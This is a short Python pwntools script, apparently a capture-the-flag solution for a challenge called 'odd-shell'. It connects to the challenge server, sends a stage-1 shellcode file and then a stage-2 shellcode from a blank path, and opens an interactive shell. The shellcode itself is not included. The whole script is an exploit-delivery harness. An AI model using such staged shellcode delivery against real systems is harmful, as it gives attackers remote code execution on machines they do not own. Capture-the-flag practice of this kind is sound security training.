from pwn import *
import time

# Stage 2 shellcode can be whatever so I am not including this directly
path_to_stage2_shellcode = ""

f = remote("odd-shell.chal.uiuc.tf", 1337)

shellcode = open("odd_shell",'rb').read()
shellcode2 = open(path_to_stage2_shellcode,'rb').read()

print("Sending stage 1 shellcode: ")
f.send(shellcode)
print(f.recv())
time.sleep(1)

print("Sending stage 2 shellcode: ")
f.send(shellcode2)
f.interactive()
